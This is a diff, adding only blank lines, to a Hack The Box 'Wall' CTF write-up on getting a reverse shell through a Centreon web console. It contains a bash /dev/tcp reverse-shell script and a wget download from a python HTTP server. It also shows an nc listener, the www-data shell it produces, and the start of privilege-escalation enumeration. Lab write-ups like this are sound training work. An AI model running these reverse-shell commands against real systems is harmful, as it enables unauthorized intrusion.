@@ -126,22 +126,26 @@ For some reason I couldn't get the RCE to work and open up a reverse shell for m
 
 <center><img src="/htb/wall/command.png"></center>
 <br>
+
 Now to get my reverse shell I was unable to just type a <b>nc</b> command into the box to connect back to me, I had to do an extra step. First I created a bash script file on my kali machine that contains the command for the reverse shell
 ```
 #!/bin/bash
 
 bash -i >& /dev/tcp/10.10.14.21/10000 0>&1
 ```
+
 I then used <b>wget</b> from the web console combined with a <b>python SimpleHTTPServer</b> to download the file onto the box. Hit the small blue button to execute the command.
 
 <center><img src="/htb/wall/wget.png"></center>
 <br>
+
 If done correctly you should see the file get downloaded from the <b>python SimpleHTTPServer
 ```
 # python -m SimpleHTTPServer 80
 Serving HTTP on 0.0.0.0 port 80 ...
 10.10.10.157 - - [21/Sep/2019 20:07:41] "GET /shell.sh HTTP/1.1" 200 -
 ```
+
 Now with the file on the system, we can see up our reverse listener
 ```
 # nc -lvnp 10000
@@ -153,6 +157,7 @@ And to trigger the shell just go back to the web console and execute the command
 
 <center><img src="/htb/wall/execute.png"></center>
 <br>
+
 If everything works you should see a shell spawn
 ```
 # nc -lvnp 10000
@@ -165,6 +170,7 @@ bash: cannot set terminal process group (982): Inappropriate ioctl for device
 bash: no job control in this shell
 www-data@Wall:/usr/local/centreon/www$
 ```
+
 Now the <b>user.txt</b> file is stored in <b>/home/shelby/</b> but we dont have the permissions to read it. Doing some quick manual enumeration did result in me finding much so I decided to use the <b>LinEnum.sh</b> script. I copied the script over to the box using the same method as <b>shell.sh</b> but this time I executed <b>wget</b> from the command line inside the shell.
 
 Reading through the output of the script, there is and <b>SUID</b> file that stands out.
